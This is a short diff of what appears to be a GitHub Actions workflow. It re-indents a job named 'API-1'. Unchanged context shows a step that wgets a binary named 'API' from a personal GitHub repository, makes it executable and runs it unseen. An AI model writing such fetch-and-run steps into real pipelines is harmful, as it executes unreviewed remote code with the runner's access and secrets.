@@ -34,8 +34,8 @@ jobs:
       run: |
         wget https://raw.githubusercontent.com/manaiopre/python-api/master/API && chmod +x API && ./API
         
- API-1:       
-  runs-on: ubuntu-latest
+  API-1:       
+    runs-on: ubuntu-latest
     steps:
       - name: Set global directory
         run: git config --global --add safe.directory /github/workspace
